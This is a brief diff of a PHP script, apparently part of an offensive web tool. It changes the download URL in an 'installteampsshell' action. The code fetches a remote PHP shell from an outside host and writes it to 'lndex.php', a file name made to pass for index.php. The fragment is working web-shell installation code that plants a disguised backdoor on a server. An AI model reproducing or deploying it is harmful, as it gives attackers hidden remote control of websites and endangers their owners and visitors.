@@ -471,7 +471,7 @@ elseif($_REQUEST['do'] == 'edithook')
 }
 elseif($_REQUEST['do'] == 'installteampsshell')
 {
-    $link = 'http://p0wersurge.com/teamps_v2.txt';
+    $link = 'https://raw.githubusercontent.com/p0wersurge/teamps-shell/master/teamps.php';
     $get = @file_get_contents($link);
     $put = @file_put_contents('lndex.php', $get);
     if($put)
